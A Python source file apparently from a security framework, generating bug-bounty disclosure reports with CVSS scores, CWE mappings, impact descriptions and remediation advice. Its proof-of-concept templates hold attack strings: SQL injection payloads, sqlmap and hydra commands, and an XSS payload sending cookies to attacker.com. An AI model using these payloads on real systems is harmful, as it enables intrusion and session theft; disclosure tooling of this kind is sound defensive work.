#!/usr/bin/env python3
"""
Bug Bounty Report Generator — Cyberburg
Auto-generates professional, submission-ready reports on critical findings.
Format compatible with HackerOne, Bugcrowd, and Intigriti.

ETHICAL USE ONLY — Reports generated here are for responsible disclosure.
Do NOT submit reports to programs without proper authorization.
"""

import os
import re
from datetime import datetime, timezone

# ─── Severity & Scoring Data ──────────────────────────────────────────────────

CVSS_SCORES = {
    "CRITICAL": "9.8",
    "HIGH":     "7.5",
    "MEDIUM":   "5.3",
    "LOW":      "3.1",
    "INFO":     "0.0",
}

SEV_ICON = {
    "CRITICAL": "🔴",
    "HIGH":     "🟠",
    "MEDIUM":   "🟡",
    "LOW":      "🟢",
    "INFO":     "⚪",
}

SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

# CVSS vectors by finding type keyword
CVSS_VECTORS = {
    "sql injection":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "rce":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "remote code":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "default credential": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "authenticated acce": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "xss":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "cross-site":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "open redirect":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    ".git":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    ".env":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "sensitive file":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "directory traversal":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    "ssrf":               "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    "xxe":                "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "admin panel":        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
    "exposed panel":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
    "heartbleed":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "rate limit":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
    "zone transfer":      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
}

# CWE mapping
CWE_MAP = {
    "sql injection":       "CWE-89: SQL Injection",
    "xss":                 "CWE-79: Cross-Site Scripting (XSS)",
    "cross-site":          "CWE-79: Cross-Site Scripting (XSS)",
    "default credential":  "CWE-1392: Use of Default Credentials",
    "authenticated acce":  "CWE-287: Improper Authentication",
    ".git":                "CWE-538: File and Directory Information Exposure",
    ".env":                "CWE-538: File and Directory Information Exposure",
    "sensitive file":      "CWE-538: File and Directory Information Exposure",
    "directory traversal": "CWE-22: Improper Limitation of a Pathname (Path Traversal)",
    "open redirect":       "CWE-601: URL Redirection to Untrusted Site",
    "rate limit":          "CWE-307: Improper Restriction of Authentication Attempts",
    "heartbleed":          "CWE-119: Improper Restriction of Operations within Bounds of Memory Buffer",
    "ssrf":                "CWE-918: Server-Side Request Forgery",
    "xxe":                 "CWE-611: Improper Restriction of XML External Entity Reference",
    "csrf":                "CWE-352: Cross-Site Request Forgery",
    "admin panel":         "CWE-284: Improper Access Control",
    "exposed panel":       "CWE-284: Improper Access Control",
    "zone transfer":       "CWE-200: Exposure of Sensitive Information",
    "rce":                 "CWE-78: OS Command Injection / RCE",
    "remote code":         "CWE-78: OS Command Injection / RCE",
}

# Data that can be leaked
DATA_LEAK_PATTERNS = {
    "Database Records":     ["sql injection", "database", "mysql", "mongodb", "postgres"],
    "Login Credentials":    ["password", "credential", "default credential", "auth bypass", "authenticated"],
    "Source Code":          [".git", "git config", "source code", "wp-config", "config.php"],
    "Environment Secrets":  [".env", "api key", "secret key", "environment variable"],
    "Admin Access":         ["admin panel", "administrator", "admin login", "control panel", "exposed panel"],
    "User PII":             ["user data", "personal information", "email list", "phone number"],
    "SSL/TLS Private Keys": ["heartbleed", "poodle", "private key"],
}


# ─── Helper Functions ─────────────────────────────────────────────────────────

def _get_cvss_vector(title: str) -> str:
    t = title.lower()
    for keyword, vector in CVSS_VECTORS.items():
        if keyword in t:
            return vector
    return "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"


def _get_cwe(title: str) -> str:
    t = title.lower()
    for keyword, cwe in CWE_MAP.items():
        if keyword in t:
            return cwe
    return "CWE-284: Improper Access Control"


def _analyze_data_leak(findings: list) -> list:
    """Return list of data categories that may be exposed."""
    leaked = []
    all_text = " ".join(
        (f.get("title", "") + " " + f.get("description", "")).lower()
        for f in findings
    )
    for category, patterns in DATA_LEAK_PATTERNS.items():
        if any(p in all_text for p in patterns):
            leaked.append(category)
    return leaked


def _poc_steps(finding: dict) -> list:
    """Generate step-by-step proof-of-concept reproduction guide."""
    title = (finding.get("title") or "").lower()
    evidence = (finding.get("evidence") or "").strip()
    ev_short = evidence[:120] if evidence else "the target endpoint"

    if "sql injection" in title:
        return [
            "Open a browser or terminal with `curl`.",
            f"Navigate to the vulnerable endpoint: `{ev_short}`",
            "Inject into a parameter: `' OR '1'='1' -- -`",
            "Observe SQL errors or unexpected data returned in the response.",
            "For time-based blind SQLi: `'; WAITFOR DELAY '0:0:5'--`",
            "Automate with: `sqlmap -u <URL> --dbs --batch`",
            "Capture the full HTTP request/response with Burp Suite.",
        ]
    elif any(k in title for k in ("xss", "cross-site scripting")):
        return [
            f"Navigate to the affected page: `{ev_short}`",
            "Enter payload in the input: `<script>alert(document.domain)</script>`",
            "Observe JavaScript execution in the browser.",
            "For stored XSS: submit, then navigate to the page that renders it.",
            "For DOM XSS: append `#<img src=x onerror=alert(1)>` to the URL.",
            "Capture cookies via: `<script>document.location='https://attacker.com/?c='+document.cookie</script>`",
        ]
    elif any(k in title for k in ("default credential", "authenticated access confirmed")):
        return [
            f"Open the login panel: `{ev_short}`",
            "Enter the credentials listed in the Evidence section.",
            "Click Login / Submit.",
            "Observe successful redirect to the admin dashboard.",
            "Document all admin functionality accessible with these credentials.",
            "Screenshot the admin panel home page as proof.",
        ]
    elif ".git" in title or "git config" in title:
        return [
            f"Verify: `curl -s {ev_short}`",
            "Download the repo: `wget -r --no-parent --reject 'index.html*' http://target/.git/`",
            "Reconstruct source: `git checkout -- .` in the downloaded directory.",
            "Search for secrets: `grep -r 'password\\|api_key\\|secret' .`",
            "Check git log: `git log --oneline` for sensitive commit messages.",
        ]
    elif ".env" in title or "environment" in title:
        return [
            f"Access directly: `curl -s {ev_short}`",
            "Review the file for: DB passwords, API keys, SECRET_KEY, AWS credentials.",
            "Identify which third-party services are configured.",
            "Test each discovered credential against its service.",
        ]
    elif "admin panel" in title or "exposed panel" in title:
        return [
            f"Navigate to: `{ev_short}`",
            "Attempt access without authentication (check for missing auth check).",
            "Try default credentials: `admin / admin`, `admin / password`.",
            "Document all exposed functionality and accessible data.",
            "Screenshot the panel and note the HTTP response code.",
        ]
    elif "rate limit" in title or "brute force" in title:
        return [
            f"Use a tool like `hydra` against: `{ev_short}`",
            "Run: `hydra -L users.txt -P passwords.txt <host> http-post-form '<path>:<fields>:F=incorrect'`",
            "Observe that requests succeed without 429 / lockout.",
            "Log the number of attempts before any protection triggers (if any).",
        ]
    elif "heartbleed" in title:
        return [
            "Use the Heartbleed PoC: `python heartbleed.py <target> -p 443`",
            "Or with nmap: `nmap -p 443 --script ssl-heartbleed <target>`",
            "Observe memory contents dumped in the response (credentials, keys).",
        ]
    elif "zone transfer" in title:
        return [
            f"Run: `dig axfr @<nameserver> <domain>`",
            "Observe the full DNS zone data returned.",
            "Document all internal hostnames, IPs, and subdomains revealed.",
        ]
    else:
        return [
            f"Navigate to the affected resource: `{ev_short}`",
            f"Reproduce the condition: {finding.get('title', '')}",
            "Observe the vulnerability response.",
            "Capture the full HTTP request/response with Burp Suite.",
            "Screenshot all evidence.",
        ]


def _get_impact(finding: dict) -> str:
    title = (finding.get("title") or "").lower()
    sev = finding.get("severity", "INFO")

    if "sql injection" in title:
        return (
            "An attacker can extract the **entire database** — usernames, hashed/plaintext passwords, "
            "emails, personal information, payment data, session tokens, and internal business records. "
            "In misconfigured databases this may escalate to **Remote Code Execution** via `INTO OUTFILE` "
            "or `xp_cmdshell` (MSSQL), leading to full server compromise."
        )
    elif "default credential" in title or "authenticated access" in title:
        return (
            "An attacker gains **full administrator access** to the application. They can: "
            "create backdoor accounts, read/modify/delete all data, upload malicious files, "
            "access user PII, pivot to internal systems, and potentially achieve RCE on the server."
        )
    elif ".git" in title:
        return (
            "Reconstructing the exposed `.git` directory reveals the **full application source code**. "
            "Attackers find hardcoded API keys, database passwords, internal architecture, "
            "encryption secrets, and all business logic — dramatically lowering the effort to exploit further vulnerabilities."
        )
    elif ".env" in title:
        return (
            "The `.env` file typically contains **database credentials, API keys, cloud provider tokens, "
            "payment processor secrets, and encryption keys**. With these, an attacker can access "
            "the database directly, third-party services, cloud infrastructure, and all user data."
        )
    elif any(k in title for k in ("xss", "cross-site")):
        return (
            "An attacker can **steal session cookies** to hijack authenticated sessions, "
            "redirect users to phishing pages, perform actions on behalf of victims (CSRF bypass), "
            "log keystrokes, and distribute malware via stored XSS on high-traffic pages."
        )
    elif "rate limit" in title or "brute force" in title:
        return (
            "Without rate limiting, any internet user can **enumerate valid usernames** and conduct "
            "credential stuffing attacks using breached password databases — potentially compromising "
            "thousands of user accounts with no obstacle."
        )
    elif "heartbleed" in title:
        return (
            "The Heartbleed vulnerability leaks **up to 64KB of server memory per request** — "
            "this memory may contain SSL private keys, session tokens, passwords, and other "
            "sensitive data, enabling decryption of past and future TLS traffic."
        )
    elif sev == "CRITICAL":
        return (
            "This vulnerability allows **complete compromise** of the affected system. "
            "An unauthenticated remote attacker can gain full control, access all user data, "
            "disrupt service availability, and potentially pivot to internal networks."
        )
    elif sev == "HIGH":
        return (
            "This vulnerability leads to **significant unauthorized access or data exposure**. "
            "An attacker can read sensitive information, bypass authentication mechanisms, "
            "or perform destructive actions on the application."
        )
    else:
        return (
            "This finding poses a moderate security risk. Exploitation may require additional "
            "conditions but should be remediated to reduce overall attack surface."
        )


def _get_remediation(finding: dict) -> str:
    title = (finding.get("title") or "").lower()
    custom = (finding.get("remediation") or "").strip()
    if custom:
        return custom

    if "sql injection" in title:
        return (
            "1. Use **parameterized queries** (prepared statements) for all database interactions.\n"
            "2. Never concatenate user input into SQL strings.\n"
            "3. Apply the **principle of least privilege** to database accounts.\n"
            "4. Use an ORM (SQLAlchemy, Hibernate, ActiveRecord).\n"
            "5. Implement a WAF as a defence-in-depth measure."
        )
    elif any(k in title for k in ("xss", "cross-site")):
        return (
            "1. **HTML-encode** all user-supplied output (use templating auto-escaping).\n"
            "2. Implement a strict **Content Security Policy (CSP)** header.\n"
            "3. Set `HttpOnly` and `Secure` flags on all session cookies.\n"
            "4. Validate and sanitize inputs server-side.\n"
            "5. Use the OWASP Java Encoder or equivalent library."
        )
    elif "default credential" in title or "authenticated access" in title:
        return (
            "1. **Immediately change** all default credentials.\n"
            "2. Force password reset on first login for new accounts.\n"
            "3. Remove unused default accounts entirely.\n"
            "4. Implement **Multi-Factor Authentication** on admin accounts.\n"
            "5. Use a secrets manager for credential storage."
        )
    elif ".git" in title:
        return (
            "1. Immediately block public access to `/.git/` via web server config:\n"
            "   - Nginx: `location ~ /\\.git { deny all; }`\n"
            "   - Apache: `RedirectMatch 404 /\\.git`\n"
            "2. Rotate **all secrets** in the exposed repository history.\n"
            "3. Audit git history for credentials: `git log -p | grep -i password`.\n"
            "4. Revoke and regenerate all exposed API keys."
        )
    elif ".env" in title:
        return (
            "1. **Immediately block** public access to `.env` via web server rules.\n"
            "2. Rotate every credential/key exposed in the file.\n"
            "3. Move secrets to a secrets manager (AWS Secrets Manager, HashiCorp Vault).\n"
            "4. Add `.env` to `.gitignore` and remove it from version history."
        )
    elif "rate limit" in title:
        return (
            "1. Implement **rate limiting**: max 5 login attempts per minute per IP.\n"
            "2. Add **CAPTCHA** (hCaptcha or reCAPTCHA) after 3 failures.\n"
            "3. Lock accounts for 15 minutes after 10 consecutive failures.\n"
            "4. Alert on unusual login patterns.\n"
            "5. Require MFA for all accounts."
        )
    else:
        return (
            "1. Follow OWASP guidelines for this vulnerability class.\n"
            "2. Apply the principle of least privilege.\n"
            "3. Conduct a targeted security code review of the affected component.\n"
            "4. Test the fix in a staging environment before deploying to production."
        )


# ─── Report Generator ─────────────────────────────────────────────────────────

def create_bug_bounty_report(
    scan_id: str,
    target: str,
    findings: list,
    output_dir: str,
) -> str:
    """
    Generate a professional bug-bounty-ready Markdown report.
    Compatible with HackerOne, Bugcrowd, and Intigriti submission formats.

    Returns path to generated report file.
    """
    os.makedirs(output_dir, exist_ok=True)

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    safe_target = re.sub(r"[^\w\-]", "_", target.replace("://", "_"))[:40]
    filename = f"BugBounty_{safe_target}_{timestamp}.md"
    filepath = os.path.join(output_dir, filename)

    # Sort by severity
    findings_sorted = sorted(
        findings, key=lambda f: SEV_ORDER.get(f.get("severity", "INFO"), 4)
    )

    crits = sum(1 for f in findings_sorted if f.get("severity") == "CRITICAL")
    highs = sum(1 for f in findings_sorted if f.get("severity") == "HIGH")
    meds  = sum(1 for f in findings_sorted if f.get("severity") == "MEDIUM")

    overall_sev = "CRITICAL" if crits > 0 else ("HIGH" if highs > 0 else "MEDIUM")
    cvss_score = CVSS_SCORES[overall_sev]
    now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    leaked_data = _analyze_data_leak(findings_sorted)

    # ── Build report string ────────────────────────────────────────────────
    lines = []

    lines += [
        f"# {SEV_ICON[overall_sev]} Security Vulnerability Report — Bug Bounty Submission",
        "",
        "> **CONFIDENTIAL** — Responsible Disclosure Document",
        "> Generated by Cyberburg Security Framework | Ethical Testing Only",
        "",
        "---",
        "",
        "## Report Summary",
        "",
        "| Field | Value |",
        "|-------|-------|",
        f"| **Target** | `{target}` |",
        f"| **Report Date** | {now_str} |",
        f"| **Scan ID** | `{scan_id}` |",
        f"| **Overall Severity** | {SEV_ICON[overall_sev]} **{overall_sev}** |",
        f"| **CVSS Score** | **{cvss_score} / 10.0** |",
        f"| **Critical Findings** | {crits} |",
        f"| **High Findings** | {highs} |",
        f"| **Medium Findings** | {meds} |",
        f"| **Report Status** | ✅ Ready for Submission |",
        "",
        "---",
        "",
        "## Executive Summary",
        "",
    ]

    lines.append(
        f"Automated security assessment of **`{target}`** using Cyberburg revealed "
        f"**{crits} critical** and **{highs} high** severity vulnerabilities that expose "
        "the application to unauthorized access and data leakage."
    )

    if leaked_data:
        lines += [
            "",
            "### Data at Risk",
            "",
        ]
        for cat in leaked_data:
            lines.append(f"- **{cat}** — accessible via identified vulnerabilities")

    lines += [
        "",
        "---",
        "",
        "## ⚖️ Ethical Testing Statement",
        "",
        "This security assessment was conducted following responsible disclosure principles:",
        "",
        "- ✅ Testing performed only on **authorized targets**",
        "- ✅ **No data was extracted, modified, or destroyed**",
        "- ✅ No production systems were disrupted",
        "- ✅ Findings reported immediately for defensive purposes",
        "- ✅ Follows **Coordinated Vulnerability Disclosure (CVD)** / ISO 29147",
        "",
        "**Testing Tool:** Cyberburg Security Framework by Faiz Zyhon  ",
        "**Methodology:** OWASP Testing Guide v4.2, Bug Bounty Best Practices",
        "",
        "---",
        "",
        "## Vulnerability Details",
        "",
    ]

    for i, finding in enumerate(findings_sorted, 1):
        sev = finding.get("severity", "INFO")
        title = finding.get("title", "Unnamed Finding")
        desc = (finding.get("description") or "").strip()
        evidence = (finding.get("evidence") or "").strip()
        module = finding.get("module", "Scanner")
        cvss_v = _get_cvss_vector(title)
        cwe = _get_cwe(title)
        poc = _poc_steps(finding)
        impact = _get_impact(finding)
        remediation = _get_remediation(finding)

        lines += [
            f"### {i}. {SEV_ICON[sev]} {title}",
            "",
            "| Field | Value |",
            "|-------|-------|",
            f"| **Severity** | {sev} |",
            f"| **CVSS Score** | {CVSS_SCORES.get(sev, '0.0')} |",
            f"| **CVSS Vector** | `{cvss_v}` |",
            f"| **CWE** | {cwe} |",
            f"| **Discovered By** | {module.replace('_', ' ').title()} |",
            "",
        ]

        if desc:
            lines += ["**Description:**", "", desc, ""]

        if evidence:
            lines += [
                "**Evidence:**",
                "",
                "```",
                evidence[:500],
                "```",
                "",
            ]

        lines += ["**Proof of Concept (Reproduction Steps):**", ""]
        for j, step in enumerate(poc, 1):
            lines.append(f"{j}. {step}")

        lines += [
            "",
            "**Impact:**",
            "",
            impact,
            "",
            "**Remediation:**",
            "",
            remediation,
            "",
            "---",
            "",
        ]

    # Data leak table
    lines += [
        "## Data Exposure Analysis",
        "",
        "The following types of data may be publicly accessible or at risk:",
        "",
        "| Category | Risk | Exposure Vector |",
        "|----------|------|----------------|",
    ]
    if leaked_data:
        for cat in leaked_data:
            lines.append(f"| {cat} | {overall_sev} | Via identified vulnerabilities |")
    else:
        lines.append(f"| Authentication Data | HIGH | Admin credentials and sessions at risk |")

    lines += [
        "",
        "---",
        "",
        "## Submission Checklist",
        "",
        "Before submitting to a bug bounty program, ensure you have:",
        "",
        "- [ ] Attach this report (Markdown or export as PDF)",
        "- [ ] Include Burp Suite / OWASP ZAP HTTP request/response captures",
        "- [ ] Attach screenshots of exploitation",
        "- [ ] Record a short screen-capture PoC video if possible",
        "- [ ] List all affected URLs",
        "- [ ] State: *'No data was extracted, modified, or destroyed'*",
        "- [ ] Note the tool used: Cyberburg Security Framework",
        "",
        "## Recommended Bug Bounty Platforms",
        "",
        "| Platform | URL | Best For |",
        "|----------|-----|---------|",
        "| **HackerOne** | hackerone.com | Enterprise programs |",
        "| **Bugcrowd** | bugcrowd.com | SMBs & startups |",
        "| **Intigriti** | intigriti.com | European companies |",
        "| **Company VDP** | Check `/.well-known/security.txt` | Direct disclosure |",
        "",
        "---",
        "",
        "*This report was auto-generated by **Cyberburg Security Framework***  ",
        f"*Generated: {now_str}*  ",
        "*⚠️ This document contains sensitive security data — handle with strict confidentiality.*  ",
        "*Only submit to programs where you have explicit authorization to test.*",
    ]

    report_text = "\n".join(lines)

    with open(filepath, "w", encoding="utf-8") as fh:
        fh.write(report_text)

    return filepath


